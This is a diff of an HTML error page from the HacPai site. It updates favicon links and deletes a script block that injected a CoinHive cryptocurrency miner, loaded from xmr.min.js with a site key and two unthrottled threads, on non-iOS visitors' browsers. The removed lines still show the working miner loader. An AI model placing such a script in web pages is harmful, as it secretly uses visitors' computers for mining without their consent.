@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <title>发现一个问题 o(╯□╰)o - HacPai</title>
-    <link rel="icon" type="image/png" href="images/favicon.png"/>
+    <link rel="icon" type="image/png" href="https://static.hacpai.com/images/favicon.png" />
+    <link rel="apple-touch-icon" href="https://static.hacpai.com/images/faviconH.png">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/>
     <style>
         html {
@@ -68,15 +69,6 @@
     <a href="http://b3log.org/">B3log</a>
 </p>
 <script>
-  if (!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
-    const scriptDom = document.createElement('script')
-    scriptDom.setAttribute('src', 'https://static.hacpai.com/js/lib/xmr.min.js')
-    document.head.appendChild(scriptDom)
-    scriptDom.onload = function () {
-      (new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0})).start();
-    };
-  }
-
   var S = {
     init: function () {
       S.Drawing.init('.canvas');
